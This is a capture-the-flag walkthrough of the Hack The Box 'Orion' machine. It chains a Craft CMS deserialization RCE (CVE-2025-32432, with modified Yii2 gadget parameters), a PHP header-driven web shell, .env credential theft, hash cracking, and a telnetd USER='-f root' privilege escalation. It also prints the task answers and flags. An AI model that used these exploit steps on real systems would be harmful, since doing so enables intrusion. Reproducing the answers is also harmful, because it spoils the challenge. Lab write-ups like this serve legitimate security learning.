<div align="center">

# 🛰️ HTB — Orion — Walkthrough by Safwen Amaira (Born As Root)

**Easy · Linux · EU Machines 3**

![Status](https://img.shields.io/badge/status-pwned-success)
![Difficulty](https://img.shields.io/badge/difficulty-easy-brightgreen)
![OS](https://img.shields.io/badge/OS-Linux-blue)
![XP](https://img.shields.io/badge/XP-585-orange)

</div>

---

## 📋 Machine Info

| Field          | Value            |
| -------------- | ---------------- |
| **Target IP**  | `10.129.244.146` |
| **Hostname**   | `orion.htb`      |
| **OS**         | Linux (Ubuntu)   |
| **Difficulty** | Easy             |
| **Released**   | 2026             |
| **Status**     | ✅ Fully Rooted   |

---

## 📑 Table of Contents

* [1. Reconnaissance](#1-reconnaissance)
* [2. Task Answers Recap](#2-task-answers-recap)
* [3. The Web Server With a Vulnerable CMS](#3-the-web-server-with-a-vulnerable-cms)
* [4. Craft CMS 5.6.16: The First Crack](#4-craft-cms-5616-the-first-crack)
* [5. CVE-2025-32432 and the Yii2 Problem](#5-cve-2025-32432-and-the-yii2-problem)
* [6. Foothold as www-data](#6-foothold-as-www-data)
* [7. The .env File That Should Have Stayed Secret](#7-the-env-file-that-should-have-stayed-secret)
* [8. MySQL, Adam and a Password Called darkangel](#8-mysql-adam-and-a-password-called-darkangel)
* [9. SSH as Adam](#9-ssh-as-adam)
* [10. User Flag](#10-user-flag)
* [11. The Local Telnet Service](#11-the-local-telnet-service)
* [12. telnetd 2.7 and the Root Shortcut](#12-telnetd-27-and-the-root-shortcut)
* [13. Root Flag](#13-root-flag)
* [14. Summary and Lessons Learned](#14-summary-and-lessons-learned)
* [15. Tools Used](#15-tools-used)

---

# 1. Reconnaissance

## 🔎 Initial Port Scan

```bash
nmap orion.htb
```

```text
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

> **📝 My Explanation:**

Two ports.

SSH and HTTP.

The classic HTB starter pack.

Nothing immediately interesting on SSH, so naturally HTTP became the first victim.

Visiting the web server redirected to:

```text
http://orion.htb
```

So I added the hostname to `/etc/hosts`:

```bash
sudo sh -c 'echo "10.129.244.146 orion.htb" >> /etc/hosts'
```

Then back to the browser.

And there it was.

A **Craft CMS** installation.

The machine had officially stopped pretending to be interesting and started leaving breadcrumbs.

---

# 2. Task Answers Recap

For anyone who wants the answers before reading the entire story:

| # | Question                                    | Answer                             |
| - | ------------------------------------------- | ---------------------------------- |
| 1 | Number of open TCP ports                    | `2`                                |
| 2 | CMS running on the web server               | `5.6.16`                        |
| 3 | User obtained through the initial RCE       | `www-data`                         |
| 4 | Location of the Craft CMS environment file  | `/var/www/html/craft/.env`         |
| 5 | Password recovered from the database        | `darkangel`                        |
| 6 | User flag                                   | `1f340c09d3ae73c5473fddddfbd6c2e7` |
| 7 | Local service used for privilege escalation | `Telnet`                           |
| 8 | GNU Inetutils telnetd version               | `2.7`                              |
| 9 | Root flag                                   | `3ce6f0533ee6869ff5f6df0b1f50f426` |

---

# 3. The Web Server With a Vulnerable CMS

A quick fingerprint confirmed the CMS version:

```bash
curl -s http://orion.htb/admin/login | grep -oE 'Craft CMS [0-9.]+'
```

```text
Craft CMS 5.6.16
```

Craft CMS **5.6.16** immediately stood out.

A quick search for known vulnerabilities revealed **CVE-2025-32432**, an unauthenticated remote code execution vulnerability affecting vulnerable Craft CMS versions.

No authentication.

No admin account.

Just a vulnerable CMS sitting there waiting for somebody to make a bad HTTP request.

Exactly what we like to see.

---

# 4. Craft CMS 5.6.16: The First Crack

The vulnerable endpoint involved Craft's asset transform functionality:

```text
/actions/assets/generate-transform
```

The exploit chain abuses Yii2 object handling through a crafted serialized object and eventually gets execution through a poisoned file.

The public PoC initially targeted:

```text
yii\rbac\PhpManager
```

But there was a small problem.

Orion was running a newer Yii2 version where the original gadget chain no longer worked directly.

So instead of giving up, it was time to actually read the code.

Because apparently sometimes the exploit needs an exploit.

---

# 5. CVE-2025-32432 and the Yii2 Problem

The original gadget attempted to use:

```text
handle[as gadget][class] = yii\rbac\PhpManager
```

Yii2's newer behavior checks caused the direct approach to fail.

The bypass was to provide a valid Behavior class first:

```text
handle[as gadget][class] = craft\behaviors\FieldLayoutBehavior
```

and then override the instantiated class through:

```text
handle[as gadget][__class] = yii\rbac\PhpManager
```

The final gadget parameters became:

```text
handle[as gadget][class] = craft\behaviors\FieldLayoutBehavior
handle[as gadget][__class] = yii\rbac\PhpManager
handle[as gadget][itemFile] = ...
```

That small change was enough to get around the newer Yii2 restriction.

### 💭 Side Thought

This is one of those moments where the exploit author probably went:

> "Okay, the gadget is dead."

And then spent several hours discovering that the gadget was merely taking a nap.

---

## Dropping the PHP Wrapper

The exploit eventually writes a PHP wrapper:

```text
/tmp/.cve32432_w.php
```

The wrapper checks the incoming `X-Cmd` header and executes it:

```php
system($_SERVER['HTTP_X_CMD']);
```

Once the wrapper was in place, command execution could be triggered through the vulnerable Craft endpoint.

A simple test:

```bash
python3 exploit.py -u http://orion.htb -c id
```

Eventually:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

And just like that:

```text
Craft CMS
    ↓
CVE-2025-32432
    ↓
www-data
```

---

# 6. Foothold as www-data

The initial shell was running as:

```text
www-data
```

So the next step was basic post-exploitation enumeration.

```bash
id
whoami
pwd
hostname
```

The web root contained the Craft installation:

```text
/var/www/html/craft
```

The obvious next target was the configuration.

Craft CMS stores database credentials in its environment file.

And thankfully, the machine had not hidden it particularly well.

---

# 7. The .env File That Should Have Stayed Secret

```bash
cat /var/www/html/craft/.env
```

Relevant values:

```text
CRAFT_DB_DRIVER=mysql
CRAFT_DB_SERVER=127.0.0.1
CRAFT_DB_PORT=3306
CRAFT_DB_DATABASE=orion
CRAFT_DB_USER=root
CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!
```

The application database was:

```text
orion
```

and MySQL was listening locally:

```text
127.0.0.1:3306
```

The database password was:

```text
SuperSecureCraft123Pass!
```

So naturally:

```bash
mysql -u root -p
```

Password:

```text
SuperSecureCraft123Pass!
```

And we were in.

---

# 8. MySQL, Adam and a Password Called darkangel

Inside MySQL:

```sql
USE orion;
SELECT id, email, password FROM users;
```

The interesting user was:

```text
adam@orion.htb
```

with the following bcrypt hash:

```text
$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS
```

A bcrypt hash means we are not simply going to `echo` it into `base64 -d` and call it a day.

I extracted the hash and cracked it with John:

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Eventually:

```text
darkangel
```

The application had just handed us an SSH credential.

### 💭 Side Thought

The database password was already sitting in `.env`.

Then the database gave us Adam's password hash.

Then RockYou gave us the actual password.

At this point Orion was less of a penetration test and more of a guided tour through increasingly sensitive files.

---

# 9. SSH as Adam

With the password recovered:

```text
adam : darkangel
```

SSH was the obvious next move.

```bash
ssh adam@10.129.244.146
```

Password:

```text
darkangel
```

And:

```text
adam@orion:~$
```

We now had a proper user shell.

The web application was officially no longer needed.

---

# 10. User Flag

The user flag was sitting in Adam's home directory:

```bash
cat ~/user.txt
```

```text
1f340c09d3ae73c5473fddddfbd6c2e7
```

### 🚩 User Flag

```text
1f340c09d3ae73c5473fddddfbd6c2e7
```

At this point the attack chain was:

```text
HTTP
 ↓
Craft CMS
 ↓
CVE-2025-32432
 ↓
www-data
 ↓
.env
 ↓
MySQL
 ↓
Adam bcrypt hash
 ↓
darkangel
 ↓
SSH
 ↓
adam
```

One flag down.

One more to go.

---

# 11. The Local Telnet Service

Time for privilege escalation.

First, enumerate listening services:

```bash
ss -lntp
```

Output included:

```text
127.0.0.53:53
127.0.0.1:23
0.0.0.0:80
0.0.0.0:22
127.0.0.1:3306
```

Port **23** immediately stood out.

Telnet.

But it was only bound to:

```text
127.0.0.1
```

So this was not remotely accessible.

That did not make it irrelevant.

It made it interesting.

---

## Identifying the Service

```bash
ps aux | grep -Ei 'telnet|inetd|xinetd'
```

```text
root       995 ... /usr/sbin/inetutils-inetd
```

Then:

```bash
cat /etc/inetd.conf
```

The important line:

```text
127.0.0.1:telnet stream tcp nowait root /usr/local/sbin/telnetd telnetd
```

So the local Telnet service was being launched by:

```text
inetutils-inetd
```

as:

```text
root
```

That deserved a closer look.

---

# 12. telnetd 2.7 and the Root Shortcut

Checking the Telnet daemon:

```bash
/usr/local/sbin/telnetd --version
```

returned:

```text
telnetd (GNU inetutils) 2.7
Copyright (C) 2025 Free Software Foundation, Inc.
```

Version:

```text
2.7
```

This version is vulnerable to **CVE-2026-24061**, involving unsafe handling of the `USER` environment variable by `telnetd` and `login`.

The important part was that `login` accepts:

```text
-f root
```

to indicate that authentication for the specified user has already been performed.

Telnetd was passing the user-controlled value through.

So instead of trying to find some complicated SUID chain, the escalation was beautifully stupid.

Set:

```text
USER="-f root"
```

and connect to the local Telnet service:

```bash
USER="-f root" telnet -a 127.0.0.1
```

And then:

```text
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.

Linux 5.15.0-177-generic (orion) (pts/1)

Welcome to Ubuntu 22.04.5 LTS...
```

Then:

```text
root@orion:~#
```

Check it:

```bash
id
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

### 💭 Side Thought

I spent time checking the Telnet binary, permissions, writable directories and the usual privilege escalation suspects.

The actual exploit was:

```bash
USER="-f root" telnet -a 127.0.0.1
```

One environment variable.

One local connection.

Root.

Linux privilege escalation occasionally has the same energy as accidentally discovering that the front door was never locked.

---

# 13. Root Flag

Now that we had:

```text
root@orion:~#
```

the final step was almost disappointingly simple.

```bash
ls
```

```text
root.txt
snap
```

Then:

```bash
cat root.txt
```

```text
3ce6f0533ee6869ff5f6df0b1f50f426
```

### 🚩 Root Flag

```text
3ce6f0533ee6869ff5f6df0b1f50f426
```

**Orion: fully rooted.**

---

# 14. Summary and Lessons Learned

* **Always fingerprint web applications.**
  Identifying Craft CMS and its exact version immediately narrowed the attack surface.

* **Version numbers matter.**
  Craft CMS `5.6.16` was vulnerable to CVE-2025-32432, providing an unauthenticated path to remote code execution.

* **Do not blindly trust public PoCs.**
  The original Yii2 gadget needed modification because of behavior changes in the installed Yii2 version. Understanding why the exploit worked was more valuable than simply copying it.

* **`.env` files remain dangerous.**
  The Craft installation exposed its MySQL root password directly through:

  ```text
  /var/www/html/craft/.env
  ```

* **Application credentials can become system credentials.**
  The database contained Adam's bcrypt password hash, which cracked to:

  ```text
  darkangel
  ```

* **Enumerate localhost services.**
  The interesting Telnet service was not remotely accessible. It only listened on:

  ```text
  127.0.0.1:23
  ```

  but became reachable once we had a shell on the machine.

* **Check unusual local daemons and their versions.**
  GNU Inetutils `telnetd 2.7` was the final privilege escalation vector.

* **Sometimes the shortest exploit is the best exploit.**
  The entire final escalation was:

  ```bash
  USER="-f root" telnet -a 127.0.0.1
  ```

### Final Attack Chain

```text
┌─────────────────────────────┐
│        orion.htb            │
│        10.129.244.146       │
└──────────────┬──────────────┘
               │
               ▼
      ┌─────────────────┐
      │ Craft CMS 5.6.16│
      └────────┬────────┘
               │
               ▼
       CVE-2025-32432
               │
               ▼
          www-data
               │
               ▼
      /var/www/html/craft/.env
               │
               ▼
          MySQL root
               │
               ▼
       Adam bcrypt hash
               │
               ▼
          darkangel
               │
               ▼
          SSH as adam
               │
               ▼
       localhost:23/Telnet
               │
               ▼
     GNU telnetd 2.7
               │
               ▼
       CVE-2026-24061
               │
               ▼
             root
```

### Flags

```text
USER
1f340c09d3ae73c5473fddddfbd6c2e7

ROOT
3ce6f0533ee6869ff5f6df0b1f50f426
```

---

# 15. Tools Used

* `nmap`
* `curl`
* `grep`
* Python 3
* CVE-2025-32432 PoC
* MySQL
* John the Ripper
* `ssh`
* `ss`
* `ps`
* `telnet`
* GNU Inetutils `telnetd`
* Basic Linux enumeration commands

---

<div align="center">

## 🛰️ Orion, Fully Rooted

**HTB Easy · Linux · EU Machines 3**

**Walkthrough by Safwen Amaira (Born As Root)**

</div>
